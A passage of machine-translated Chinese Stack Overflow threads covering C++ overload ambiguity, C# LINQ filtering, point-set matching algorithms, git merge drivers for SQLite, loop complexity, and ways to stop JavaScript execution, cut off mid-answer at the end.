考虑一下这个表达式。内置运算符使用转换运算符 long double() 通过用户定义的类型转换序列匹配第一个参数。但是您的函数通过从 int 到 long double（整数到浮点转换）的标准转换序列匹配第二个参数。当有两个参数的转换时总是模棱两可的，但至少有一个参数可以转换得更好，而其余的参数在一次调用中不会转换得更糟。在您的情况下，内置函数更好地匹配第二个参数，但第一个更差，但您的函数更好地匹配第一个参数，但第二个更差。

这很令人困惑，所以这里有一些示例（从 char 到 int 的转换称为提升，这比从 char 到非 int 的转换更好，这称为转换）：

```
void f(int, int);
void f(long, long);
f('a', 'a'); 
```

调用第一个版本。因为第一个参数的所有参数都可以更好地转换。同样，以下仍将调用第一个：

```
void f(int, long);
void f(long, long);
f('a', 'a'); 
```

因为第一个可以转换得更好，而第二个不能转换得更差。但以下是*模棱两可*的：

```
void f(char, long);
void f(int, char);
f('a', 'a'); // ambiguous 
```

在这种情况下更有趣。第一个版本通过完全匹配接受第一个参数。第二个版本通过完全匹配接受第二个参数。但是两个版本至少同样好地不接受他们的另一个论点。第一个版本需要对其第二个参数进行转换，而第二个版本需要对其参数进行提升。因此，即使促销比转换更好，对第二个版本的调用也会失败。

这与您上面的情况非常相似。即使标准转换序列（从 int/float/double 转换为 long double）比用户定义的转换序列（从 MyClass 转换为 long double）更好，但不会选择您的运算符版本，因为您的其他参数（long *double* ) 需要从参数进行转换，这比内置运算符对该参数的需要更差（完美匹配）。

重载解析在 C++ 中是一件复杂的事情，因此人们不可能记住其中的所有微妙规则。但是得到粗略的计划是很有可能的。我希望它对你有帮助。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-15T09:10:17.123

通过提供对 a 的隐式转换，`double`您实际上是在说明，我的类等效于 a `double`，因此您不应该真正介意是否使用内置运算符 >= for `double`s。如果您*确实*关心，那么您的类实际上并不“等效于” a`double`并且您应该考虑不提供对 的*隐式*转换`double`，而是提供*显式*GetAsDouble 或 ConvertToDouble 成员函数。

您目前有歧义的原因是对于一个表达式`t >= d`，其中`t`是您的类的实例并且`d`是双精度，编译器总是必须提供左侧或右侧的转换，因此表达式真的是模棱两可的。要么调用`t`'s`operator double`并使用内置运算符 >= for `double`s，要么必须将 d 提升为 a`long double`并使用您的成员运算符 >=。

编辑，您已经更新了您的问题，表明您的转换是 long double 并且您的比较是针对 int 的。在这种情况下，最后一段应为：

你现在有歧义的原因是，对于一个表达式`t >= d`where `t`is 你的类的一个实例并且`d`is an `int`，编译器总是必须提供左侧或右侧的转换，所以表达式真的是模糊的。要么调用`t`'s`operator long double`并使用内置运算符 >= for `long double`and `int`，要么必须将 d 提升为 a`long double`并使用您的成员运算符 >=。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-15T09:12:05.293

我假设您正在与文字进行比较`int`，而不是`long double`：

```
MyClass o;

if (o >= 42)
{
   // ...
} 
```

如果是这种情况，两种选择都一样好/复杂。

使用你的`operator long double()`：

1.  `MyClass::operator long double()`
2.  内置`operator>=(long double, int)`

使用你的`MyClass::operator>=(long double)`：

1.  内置转换`int`为`long double`
2.  `MyClass::operator>=(long double)`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-15T09:03:11.867

你已经`long double`在声明中了。尝试将其更改为`double`.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-15T09:09:09.857

您将运算符重载与自定义转换结合使用可能会让您的类的用户非常困惑。问问自己，这个类的用户会*期望*它把自己转换成一个双精度数，还是可以与一个双精度数相媲美？有一个 .greaterThan(double) 函数不会达到相同的目标但不会让用户感到惊讶吗？

我想你总是可以在比较之前明确地将你的对象转换为 double，以避免歧义。但如果我是你，我会重新考虑上面的方法，并专注于编写直观且行为方式并不令人惊讶的代码，而不是花哨的类型转换和运算符重载。

（灵感来自 FQA[关于运算符重载的精彩咆哮](http://yosefk.com/c++fqa/operator.html#fqa-13.2)）

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-02-15T16:10:04.023

*   ***内置运算符>=(long double, int)。***

看起来你已经定义了：

```
bool class::operator>=(long double value) { return value >= classValue; } 
```

而你错过了：

```
bool class::operator>=(double value)      { return value >= classValue; }
bool class::operator>=(int value)         { return value >= classValue; } 
```

所以编译器无法决定转换哪种方式。（这是模棱两可的。）

也许模板函数（或方法）会有所帮助？

注意**a>=b调用与****b>=a**不同的方法的情况。

# c# - 使用 lambda 表达式获取数组元素相等的子集

> ID：550556
> 
> 赞同：5
> 
> 时间：2009-02-15T09:04:15.763
> 
> 标签：c#, lambda

我有一个有趣的问题，我似乎无法弄清楚 lambda 表达式来完成这项工作。

我有以下代码：

```
List<string[]> list = GetSomeData(); // Returns large number of string[]'s
List<string[]> list2 = GetSomeData2(); // similar data, but smaller subset
&nbsp;
List<string[]> newList = list.FindAll(predicate(string[] line){ 
    return (???);
}); 
```

我只想返回列表中每个字符串 [] 的元素 0 等于列表 2 中的元素 0 之一的那些记录。

列表包含这样的数据：

```
"000", "Data", "more data", "etc..." 
```

list2 包含如下数据：

```
"000", "different data", "even more different data" 
```

从根本上说，我可以这样编写代码：

```
List<string[]> newList = new List<string[]>();
foreach(var e in list)
{
    foreach(var e2 in list2)
    {
        if (e[0] == e2[0])
            newList.Add(e);
    }
}
return newList; 
```

但是，我正在尝试使用泛型和 lambda 的更多，所以我正在寻找一个很好的干净的解决方案。不过，这让我感到沮丧..也许是在查找中的查找？

编辑：下面马克的回答让我尝试了一个看起来像这样的变化：

```
var z = list.Where(x => list2.Select(y => y[0]).Contains(x[0])).ToList(); 
```

我不确定这是多么有效，但它有效并且足够简洁。还有人有什么建议吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-02-15T09:08:44.397

你能加入吗？不过，我自己会使用两个步骤：

```
var keys = new HashSet<string>(list2.Select(x => x[0]));
var data = list.Where(x => keys.Contains(x[0])); 
```

如果您只有 .NET 2.0，则安装[LINQBridge](http://www.albahari.com/nutshell/linqbridge.aspx)并使用上述（或类似`Dictionary<>`if LINQBridge doesn't include `HashSet<>`），或者使用嵌套`Find`：

```
var data = list.FindAll(arr => list2.Find(arr2 => arr2[0] == arr[0]) != null); 
```

请注意，虽然该`Find`方法是 O(n*m)，但由于该`HashSet<>`方法是 O(n+m)...

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-15T09:12:48.677

您可以在 System.Linq 中使用 Intersect 扩展方法，但您需要提供一个 IEqualityComparer 来完成这项工作。

```
 static void Main(string[] args)
    {
        List<string[]> data1 = new List<string[]>();
        List<string[]> data2 = new List<string[]>();

        var result = data1.Intersect(data2, new Comparer());
    }

    class Comparer : IEqualityComparer<string[]>
    {
        #region IEqualityComparer<string[]> Members

        bool IEqualityComparer<string[]>.Equals(string[] x, string[] y)
        {
            return x[0] == y[0];
        }

        int IEqualityComparer<string[]>.GetHashCode(string[] obj)
        {
            return obj.GetHashCode();
        }

        #endregion
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-24T05:22:24.950

~~相交可能对你有用。Intersect 查找两个列表中的所有项目。~~ 好的，重新阅读问题。Intersect 不考虑顺序。我编写了一个稍微复杂的 linq 表达式，它将返回一个位于相同位置（索引）且具有相同值的项目列表。

```
List<String> list1 = new List<String>() {"000","33", "22", "11", "111"};
List<String> list2 = new List<String>() {"000", "22", "33", "11"};

List<String> subList = list1.Select ((value, index) => new { Value = value, Index = index})
             .Where(w => list2.Skip(w.Index).FirstOrDefault() == w.Value )
             .Select (s => s.Value).ToList();

Result: {"000", "11"} 
```

**查询说明：**

选择一组值和该值的位置。

过滤器设置第二个列表中相同位置的项目具有相同值。

只选择值（而不是索引）。

注意我使用： `list2.Skip(w.Index).FirstOrDefault() //instead of list2[w.Index]` 以便它处理不同长度的列表。

如果您知道列表的长度相同，或者 list1 总是更短，那么`list2[w.Index]`可能会更快一些。

# image - 需要更好的算法来查找具有最小距离的 2 组点之间的映射

> ID：550557
> 
> 赞同：10
> 
> 时间：2009-02-15T09:04:21.037
> 
> 标签：image, algorithm, math, mapping, mathematical-optimization

**问题：**我有两个重叠的 2D 形状，A 和 B，每个形状具有相同数量的像素，但形状不同。形状的某些部分是重叠的，并且每个形状都有一些不重叠的部分。我的目标是将形状 A 中的所有非重叠像素移动到形状 B 中的非重叠像素。由于每个形状中的像素数相同，我应该能够找到 1 对 1 的映射像素。限制是我想找到最小化所有移动像素行进的总距离的映射。

**蛮力：**解决这个问题的蛮力方法显然是不可能的，因为我必须计算我认为有 n 的所有可能映射的总距离！（其中 n 是一个形状中的非重叠像素的数量）乘以计算映射中每对点的距离的计算，n，总共得到 O(n * n!) 或类似的东西。

**回溯：**我能想到的唯一“更好”的解决方案是使用回溯，我将在其中跟踪当前的最小值，并且在我评估某个映射时的任何时候，如果我达到或超过该最小值，我继续下一个映射。即使这样也不会比 O(n!) 做得更好。

有没有办法以合理的复杂性解决这个问题？

另请注意，简单地将一个点映射到它的最近匹配邻居的“明显”方法并不总是产生最佳解决方案。

**更简单的方法？：**作为次要问题，如果不存在可行的解决方案，一种可能性可能是将每个不重叠的部分划分为小区域，并映射这些区域，从而大大减少映射的数量。为了计算两个区域之间的距离，我将使用质心（区域中像素位置的平均值）。但是，这提出了我应该如何进行分区以获得接近最佳答案的问题。

任何想法表示赞赏！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-02-15T09:51:41.563

这是最小匹配问题，你说得对，一般来说这是一个难题。然而，对于[2D 欧几里得二分最小匹配](http://maven.smith.edu/~orourke/TOPP/P6.html)情况，它可以在接近 O(n²) 的情况下求解（参见链接）。

对于快速近似，FryGuy 在模拟退火方面走在了正确的轨道上。这是一种方法。

另请查看O((n/ε)^1.5*log^5(n)) (1+ε) 随机近似方案[的平面中二分和非二分匹配的近似算法。](http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.50.8281)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-02-15T09:42:19.650

您可以考虑为此进行[模拟退火](http://en.wikipedia.org/wiki/Simulated_annealing)。首先为每个像素随机分配 A[x] -> B[y]，然后计算距离平方和。然后随机交换一对 x<->y 映射。然后选择以概率 Q 接受这个，如果新映射更好，Q 会更高，并且随着时间的推移趋向于零。请参阅维基百科文章以获得更好的解释。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2009-02-15T09:43:26.810

1.  对形状 A 中的像素进行排序：按“x”和“y”坐标的升序排列
2.  对形状 B 中的像素进行排序：按 'x' 的递减顺序，然后增加 'y'

在同一索引处映射像素：在排序列表中，A 中的第一个像素将映射到 B 中的第一个像素。这不是您要查找的映射吗？

# git - 使用 Git 合并的 SQLite 表

> ID：550566
> 
> 赞同：9
> 
> 时间：2009-02-15T09:10:32.770
> 
> 标签：git, sqlite

我有一个存储在 SQLite 数据库中的日志文件，我想将其分发到 git 存储库中。

稍后我希望对日志文件的更改自动与原始文件合并。

这行得通吗？自动二进制合并到 SQLite 文件中会不会经常爆炸？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2010-08-04T20:00:24.340

您需要在 git 配置中定义自定义合并和差异驱动程序，然后使用属性将它们与文件关联。

**这只是对转储进行简单的文本合并，因此很可能会产生完全的废话。您绝对需要检查它的工作，以确保它做正确的事情**。不过 ，它应该使简单的合并变得乏味。

在您的 .git/config 中：

```
[merge "sqlite3"]
    name = sqlite3 merge driver
    driver = merge-sqlite3 %O %A %B

[diff "sqlite3"]   
    name = sqlite3 diff driver  
    command = diff-sqlite3 
```

在 .git 属性中：

```
signons.sqlite diff=sqlite3 merge=sqlite3 
```

在你的路径中的某个地方，名为 diff-sqlite3

```
#!/usr/bin/perl -w

use File::Temp  qw/ :POSIX /;
use IPC::Run qw/run/ ;

@ARGV == 7 or die sprintf 'wtf %s', join(' ', @ARGV);

my ($name, $x, $y) = ($ARGV[0], $ARGV[1], $ARGV[4]);

my ($a, $b);

eval { 
  $a = tmpnam();
  $b = tmpnam();

  run ['sqlite3', $x, '.dump'], '>', $a or die 'sqlite3 failed';
  run ['sqlite3', $y, '.dump'], '>', $b or die 'sqlite3 failed';

  print "diff-sqlite3 a/$name b/$name\n";
  run ['diff', '-u', $a, $b, '--label', "a/$name", '--label', "b/$name"], '>', \*STDOUT;   

  unlink $a;
  unlink $b; 
  1;
} or do {
  unlink $a if defined $a;
  unlink $b if defined $b;
  die $@; 
} 
```

也在你的路径中，名为 merge-sqlite3

```
#!/usr/bin/perl -w

use File::Temp  qw/ :POSIX /;
use IPC::Run qw/run/ ;

@ARGV == 3 or die sprintf 'wtf %s', join(' ', @ARGV);

my ($o, $a, $b) = @ARGV; 

print "MERGEING SQLITE FILES $o $a $b\n"; 

eval { 
  $ad = tmpnam();
  $bd = tmpnam();
  $od = tmpnam(); 

  run ['sqlite3', $o, '.dump'], '>', $od or die 'sqlite3 failed';
  run ['sqlite3', $a, '.dump'], '>', $ad or die 'sqlite3 failed';
  run ['sqlite3', $b, '.dump'], '>', $bd or die 'sqlite3 failed';

  run ['merge', $ad, $od, $bd] or do {
    my $newname = "$a.dump";
    my $n = 0;
    while (-e $newname) {
      ++$n;
      $newname = "$a.dump.$n";
    }
    print "merge failed, saving dump in $newname\n";
    rename $ad, $newname;
    undef $ad; 
    die 'merge failed';
  };

  unlink $a or die $!;
  my $err; 
  run ['sqlite3', $a], '>', \*STDOUT, '2>', \$err, '<', $ad;
  if ('' ne $err) {
    print STDERR $err;
    die 'sqlite3 failed';
  }  

  unlink $ad if defined $ad;
  unlink $bd; 
  unlink $od;
  1;
} or do {
  unlink $ad if defined $ad;
  unlink $bd if defined $bd;
  unlink $od if defined $od;

  die $@; 
} 
```

我刚刚破解了这些，现在你可能需要解决这些问题。

请参阅： http: [//git-scm.com/docs/gitattributes](http://git-scm.com/docs/gitattributes)和[http://git-scm.com/docs/git-config](http://git-scm.com/docs/git-config)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-02-15T09:31:28.913

我不相信 git 真的是你工作的工具。git 是一个分布式源代码管理工具，而不是数据库复制工具。

git 将尝试的唯一自动合并是合并文本文件。日志文件（通常）是一个文本文件，那么为什么不将它直接放入 git 而不是先放入数据库呢？

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-02-15T15:01:42.957

我怀疑任何通用版本控制系统（git、svn、cvs 等）都可以按照您描述的方式处理数据库。如果你坚持使用 git 来合并数据库，最好的办法是把数据库转换成文本文件，合并文本文件，然后重新创建数据库。例如，

```
sqlite3 .dump > dump_file.txt 
```

可以创建重新创建数据库所需的所有 sql 语句，然后对转储文件进行处理，然后使用

```
sqlite3 newdatabase.db < modified_dump_file.txt 
```

您应该能够使用某种 git 钩子（我对 git 不太熟悉）来自动执行此操作。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-15T19:02:33.207

在一般情况下，没有办法正确合并二进制文件，所以 git 不能也不会这样做。

通过一些努力，您可以使用 git 对数据库转储进行版本控制，但除了非常简单的情况外，您必须做的不仅仅是使用直接转储。您至少需要考虑如何根据您的关键列对转储的行进行排序。否则你会得到虚假的冲突，或者产生代表垃圾数据库的语法有效转储的合并。

例如，如果具有相同键的行的不同版本出现在不同版本的转储的不同行区域中，git 可能认为保留它们是合理的。生成的转储将具有同一行的两种表示形式，这是无稽之谈。

简而言之，您可能会不高兴尝试使用源代码控制系统对数据库进行版本控制。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2017-07-09T02:32:42.850

尽管这个问题是 8 多年前提出的，但我已经发布了一个工具，可以完全满足您的要求。它使用自定义差异驱动程序，利用 sqlite 项目工具“sqldiff”，将 UUID 作为主键，并保留 sqlite rowid。它仍处于 alpha 阶段，因此非常感谢您的反馈。

[https://github.com/cannadayr/git-sqlite](https://github.com/cannadayr/git-sqlite)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2011-09-07T12:20:12.280

我在 shell 脚本中重新实现了上面的 diff 驱动程序，发现它在所有情况下都不能正常工作。该脚本假定前两个参数将文件提供给 diff，但根据`man git`提供给脚本的参数是：

*路径 旧文件 旧十六进制 旧模式 新文件 新十六进制 新模式*

这是为我做的差异：

```
#!/bin/sh

FILE_PATH=$1
OLD_FILE=$2
OLD_HEX=$3
OLD_MODE=$4
NEW_FILE=$5
NEW_HEX=$6
NEW_MODE=$7

A=`tempfile`
B=`tempfile`
test -f ${A} && test -f ${B} || exit 1

sqlite3 ${OLD_FILE} .dump > ${A} &&
sqlite3 ${NEW_FILE} .dump > ${B} &&
diff -u ${A} ${B} --label "${FILE_PATH}@${OLD_HEX}" --label "${FILE_PATH}@${NEW_HEX}"

rm ${A}
rm ${B} 
```

# complexity-theory - 复杂度计算

> ID：550571
> 
> 赞同：9
> 
> 时间：2009-02-15T09:14:04.930
> 
> 标签：complexity-theory

什么是复杂性：

```
int f4(int n)
{
   int i, j, k=1, count = 0;

   for(i = 0; i < n; i++) 
   {
      k *= 3;

      for(j = k; j; j /= 2)
         count++;
   }

   return count;
} 
```

我知道它是 O(n^2) 但你如何计算这个？为什么不是 n*log n？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2009-02-15T09:23:03.817

有 n 个外循环。在任何时候，。有内部循环（因为我们在每次迭代中减半。）`k = 3^i``log2(k)``j`

> `log2(3^i) = log3 (3^i) / log3(2) = i / (constant)`

所以内循环的复杂度是`i`。换句话说，这个程序具有相同的*复杂性*（但不完全相同的迭代次数）

```
int f4changed(int n)
{
   int i, j, count = 0;

   for(i = 0; i < n; i++) 
   {
      for(j = 0; j < i; j++)
      {
          count++;
      }
   }
} 
```

[正如您已经看到](https://stackoverflow.com/questions/526728/time-complexity-of-nested-for-loop)的那样。`O(n²)`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T09:27:17.643

i = 1 导致 3 次迭代（内部循环） (3, 1, 0)
i = 2 是 8 (5 然后 3)
i = 3 是 13 (7 + 5 + 3)

您所拥有的是近似[算术级数](http://en.wikipedia.org/wiki/Arithmetic_progression)，即 O(n ² )。

为了完整起见（并解释为什么确切的迭代次数无关紧要），请参阅[Big O 的普通英语解释](https://stackoverflow.com/questions/487258/plain-english-explanation-of-big-o/487278#487278)（这对于其他读者来说比你更适合，因为你似乎知道发生了什么，所以发帖者）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T09:38:04.310

Log(Pow(3,n)) ~ O(N) 的复杂度。如果内部循环是 k *= 2，那么迭代次数也将是 n。
为了计算 O(~)，使用最高幂项，而忽略其他项。Log(Pow(3,n)) 可以定义为：
Log(Pow(2,n)) <= Log(Pow(3,n)) <= Log(Pow(4,n))
现在 Log(Pow( 4,n)) = 2*Log(Pow(2,n))。

这里的最高幂项是 n（因为 2 是常数）。

# javascript - 如何终止 JavaScript 中的脚本？

> ID：550574
> 
> 赞同：198
> 
> 时间：2009-02-15T09:14:49.903
> 
> 标签：javascript, exit, die

我怎样才能像 PHP`exit`或一样退出 JavaScript 脚本`die`？我知道这不是最好的编程实践，但我需要这样做。

* * *

## 回答 #1

> 赞同：88
> 
> 时间：2011-08-28T19:22:43.243

“退出”函数通常会退出程序或脚本，并带有错误消息作为参数。例如 php 中的 die(...)

```
die("sorry my fault, didn't mean to but now I am in byte nirvana") 
```

**JS 中的等价物是使用throw**关键字发出错误信号，如下所示：

```
throw new Error(); 
```

您可以轻松地对此进行测试：

```
var m = 100;
throw '';
var x = 100;

x
>>>undefined
m
>>>100 
```

* * *

## 回答 #2

> 赞同：86
> 
> 时间：2009-02-15T09:17:34.157

[JavaScript 等效于 PHP 的`die`](https://github.com/kvz/phpjs/blob/master/experimental/misc/die.js). 顺便说一句，它只是调用[`exit()`](https://github.com/kvz/phpjs/blob/master/experimental/misc/exit.js)（感谢 splattne）：

```
function exit( status ) {
    // http://kevin.vanzonneveld.net
    // +   original by: Brett Zamir (http://brettz9.blogspot.com)
    // +      input by: Paul
    // +   bugfixed by: Hyam Singer (http://www.impact-computing.com/)
    // +   improved by: Philip Peterson
    // +   bugfixed by: Brett Zamir (http://brettz9.blogspot.com)
    // %        note 1: Should be considered expirimental. Please comment on this function.
    // *     example 1: exit();
    // *     returns 1: null

    var i;

    if (typeof status === 'string') {
        alert(status);
    }

    window.addEventListener('error', function (e) {e.preventDefault();e.stopPropagation();}, false);

    var handlers = [
        'copy', 'cut', 'paste',
        'beforeunload', 'blur', 'change', 'click', 'contextmenu', 'dblclick', 'focus', 'keydown', 'keypress', 'keyup', 'mousedown', 'mousemove', 'mouseout', 'mouseover', 'mouseup', 'resize', 'scroll',
        'DOMNodeInserted', 'DOMNodeRemoved', 'DOMNodeRemovedFromDocument', 'DOMNodeInsertedIntoDocument', 'DOMAttrModified', 'DOMCharacterDataModified', 'DOMElementNameChanged', 'DOMAttributeNameChanged', 'DOMActivate', 'DOMFocusIn', 'DOMFocusOut', 'online', 'offline', 'textInput',
        'abort', 'close', 'dragdrop', 'load', 'paint', 'reset', 'select', 'submit', 'unload'
    ];

    function stopPropagation (e) {
        e.stopPropagation();
        // e.preventDefault(); // Stop for the form controls, etc., too?
    }
    for (i=0; i < handlers.length; i++) {
        window.addEventListener(handlers[i], function (e) {stopPropagation(e);}, true);
    }

    if (window.stop) {
        window.stop();
    }

    throw '';
} 
```

* * *

## 回答 #3

> 赞同：57
> 
> 时间：2011-09-28T14:12:26.147

即使在没有句柄、事件等的简单程序中，最好将代码放在“主”函数中，即使它是唯一的过程：

```
<script> 
function main()
{
//code

}
main();
</script> 
```

这样，当你想停止程序时，你可以使用“return”。

* * *

## 回答 #4

> 赞同：23
> 
> 时间：2017-09-19T18:51:07.960

如果您不在乎这是一个错误，只需编写：

```
fail; 
```

这将阻止您的主要（全局）代码继续进行。对于调试/测试的某些方面很有用。

* * *

## 回答 #5

> 赞同：21
> 
> 时间：2018-04-12T17:32:26.263

有[很多方法](http://stackabuse.com/how-to-exit-in-node-js/)可以退出 JS 或 Node 脚本。以下是最相关的：

```
// This will never exit!
setInterval((function() {  
    return;
}), 5000);

// This will exit after 5 seconds, with signal 1
setTimeout((function() {  
    return process.exit(1);
}), 5000);

// This will also exit after 5 seconds, and print its (killed) PID
setTimeout((function() {  
    return process.kill(process.pid);
}), 5000);

// This will also exit after 5 seconds and create a core dump.
setTimeout((function() {  
    return process.abort();
}), 5000); 
```

如果你在[REPL](https://nodejs.org/api/repl.html)中（即在`node`命令行上运行后），你可以键入`.exit`退出。

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2017-03-18T21:12:57.213

将`debugger;`关键字放在要停止执行的 JavaScript 代码中。然后打开您喜欢的浏览器的开发者工具并重新加载页面。现在它应该会自动暂停。打开工具的**Sources**部分：`debugger;`关键字突出显示，您可以选择恢复脚本执行。

我希望它有所帮助。

*更多信息请访问：*

*   [https://developer.mozilla.org/de/docs/Tools/Debugger](https://developer.mozilla.org/de/docs/Tools/Debugger)

*   [http://www.w3schools.com/js/js_debugging.asp](http://www.w3schools.com/js/js_debugging.asp)

* * *

## 回答 #7

> 赞同：8
> 
> 时间：2017-08-22T02:03:26.147

就我而言，我使用了[`window.stop`](https://developer.mozilla.org/en-US/docs/Web/API/Window/stop).

> 停止在当前浏览上下文中`window.stop()`进一步加载资源，相当于浏览器中的*“停止”*按钮。
> 
> 由于脚本的执行方式，此方法不能中断其父文档的加载，但会停止其图像、新窗口和其他仍在加载的对象。
> 
> **用法**：（[[来源](https://developer.mozilla.org/docs/Web/API/Window/stop)][）] `window.stop();`
> [_]

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2021-06-18T21:52:09.957

可以在 devtools 中禁用 Javascript：`ctrl+shift+j`然后`cltf+shift+p`键入`disable javascript`

上面提到的可能选项：

```
window.stop(); // equivalent to the 'stop' button in the browser
debugger; // debugs
for(;;); // crashes your browser
window.location.reload(); // reloads current page 
```

如果页面已加载并且您不想调试崩溃或重新加载：

```
throw new Error(); 
```

另外清除所有[超时](https://stackoverflow.com/questions/8860188/javascript-clear-all-timeouts)

```
var id = window.setTimeout(function() {}, 0);
while (id--) {
    window.clearTimeout(id);
} 
```

中止[DOM/XMLHttpRequest](https://stackoverflow.com/questions/1802936/stop-all-active-ajax-requests-in-jquery)

```
$.xhrPool = [];
$.xhrPool.abortAll = function() {
    $(this).each(function(i, jqXHR) { 
        jqXHR.abort();  
        $.xhrPool.splice(i, 1); 
    });
}
$.ajaxSetup({
    beforeSend: function(jqXHR) { $.xhrPool.push(jqXHR); },
    complete: function(jqXHR) {
        var i = $.xhrPool.indexOf(jqXHR);
        if (i > -1) $.xhrPool.splice(i, 1); 
    }
}); 
```

删除[所有事件侦听器](https://stackoverflow.com/questions/3569393/how-to-unbind-all-event-using-jquery)，包括[内联](https://stackoverflow.com/questions/1687790/how-to-remove-onclick-with-jquery)

```
$("*").prop("onclick", null).off(); 
```

这将删除脚本并重新创建没有事件的元素

```
$('script').remove();
$('*').each(function(){
    $(this).replaceWith($(this).clone());   
}); 
```

如果网页上没有 jQuery，请将[源代码](https://code.jquery.com/jquery-3.4.1.min.js)复制粘贴到控制台中。

可能还有别的东西。在评论中告诉我。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2019-05-19T22:28:02.310

我想这个问题已经回答了，点击[这里](https://stackoverflow.com/questions/9298839/is-it-possible-to-stop-javascript-execution)了解更多信息。以下是它发布的简短答案。

```
throw new Error("Stop script"); 
```

您也可以使用浏览器添加断点，每个浏览器都相似，请查看以下浏览器信息。

Chrome 断点信息请单击[此处](https://developers.google.com/web/tools/chrome-devtools/javascript/breakpoints)
Firefox 断点信息请单击[此处](https://developer.mozilla.org/en-US/docs/Tools/Debugger/How_to/Set_a_breakpoint)
Explorer 断点信息[请单击](https://raygun.com/blog/debug-javascript-internet-explorer/)
Safari 断点信息请单击[此处](https://raygun.com/blog/debug-javascript-safari/)

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2020-04-11T20:04:48.273

在 JavaScript 中有多种方式，下面是其中的一些

**方法一：**

```
throw new Error("Something went badly wrong!"); 
```

**方法二：**

```
return; 
```

**方法三：**

```
return false; 
```

**方法四：**

```
new new 
```

**方法五：**

使用上述方法编写您的自定义函数并在您需要的地方调用

**注意：** 如果您只想暂停代码执行，您可以使用

```
debugger; 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2009-02-15T09:27:10.170

如果您正在寻找一种方法来强制终止页面上所有 Javascript 的执行，我不确定是否有官方认可的方法来做到这一点——这似乎是一种可能存在安全风险的事情（尽管老实说，我想不出我怎么会想到它）。通常在 Javascript 中，当您希望代码停止运行时，您只需`return`执行正在执行的任何函数即可。（`return`如果它是函数中的最后一件事并且函数不应返回值，则该语句是可选的）如果有某种原因返回对您来说不够好，您可能应该在问题中编辑更多细节，说明您为什么认为您需要它，也许有人可以提供替代解决方案。

请注意，在实践中，大多数浏览器的 Javascript 解释器在遇到错误时会简单地停止运行当前脚本。因此，您可以执行诸如访问未设置变量的属性之类的操作：

```
function exit() {
    p.blah();
} 
```

它*可能会*中止脚本。但是你不应该指望它，因为它根本不是标准的，而且它看起来真的是一种糟糕的做法。

*编辑*：好的，鉴于 Ólafur 的观点，这可能不是一个很好的答案。虽然`die()`他链接的函数基本上实现了我的第二段，即它只是抛出一个错误。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2019-03-01T15:40:24.483

### 扔 ””;

是对概念的误用，但可能是唯一的选择。而且，是的，您将不得不重置所有事件侦听器，就像接受的答案提到的那样。如果我是对的，您还需要一个单一的入口点。

最重要的是：您想要一个页面一旦抛出就通过电子邮件向您报告 - 您可以使用例如 Raven/Sentry 来实现此目的。但这意味着，您会产生误报。在这种情况下，您还需要更新默认处理程序以过滤掉此类事件或在 Sentry 的仪表板上将此类事件设置为忽略。

### 窗口.stop();

这在页面加载期间不起作用。它也停止对页面的解码。因此，您不能真正使用它为用户提供页面的无 javascript 变体。

### 调试器；

仅在打开调试器时停止执行。效果很好，但不是可交付成果。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2020-07-03T14:11:27.463

我知道这是旧的，但如果你想要一个类似的 PHP`die()`函数，你可以这样做：

```
function die(reason) {
    throw new Error(reason);
} 
```

用法：

```
console.log("Hello");
die("Exiting script..."); // Kills script right here
console.log("World!"); 
```

上面的例子只会打印“Hello”。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2018-10-25T13:29:10.937

这个小函数非常接近于模仿 PHP 的 exit()。与其他解决方案一样，不要添加任何其他内容。

```
function exit(Msg)
    {
    Msg=Msg?'*** '+Msg:'';
    if (Msg) alert(Msg);
    throw new Error();
    } // exit 
```

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2019-05-29T04:17:16.543

如果您在脚本中使用任何未定义的函数，则脚本将因“未捕获的 ReferenceError”而停止。我尝试了以下代码并执行了前两行。

我认为，这是停止脚本的最佳方式。如果还有其他方法，请评论我。我也想知道另一种最好最简单的方法。顺便说一句，我没有在像 PHP 这样的 Javascript 中退出或终止内置函数来终止脚本。如果有人知道，请告诉我。

```
alert('Hello');

document.write('Hello User!!!');

die();  //Uncaught ReferenceError: die is not defined

alert('bye');

document.write('Bye User!!!'); 
```

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2020-01-09T12:06:52.667

如果您只想停止进一步的代码执行而不“抛出”任何错误，您可以临时覆盖`window.onerror`，如下所示[`cross-exit`](https://github.com/Richienb/cross-exit/blob/master/browser.js)：

```
function exit(code) {
    const prevOnError = window.onerror
    window.onerror = () => {
        window.onerror = prevOnError
        return true
    }

    throw new Error(`Script termination with code ${code || 0}.`)
}

console.log("This message is logged.");
exit();
console.log("This message isn't logged."); 
```

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2020-05-01T15:49:34.340

我正在使用 iobroker 并且很容易设法停止脚本

```
stopScript(); 
```

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2020-12-06T08:22:04.937

此代码将停止当前窗口中所有 JavaScript 的执行：

```
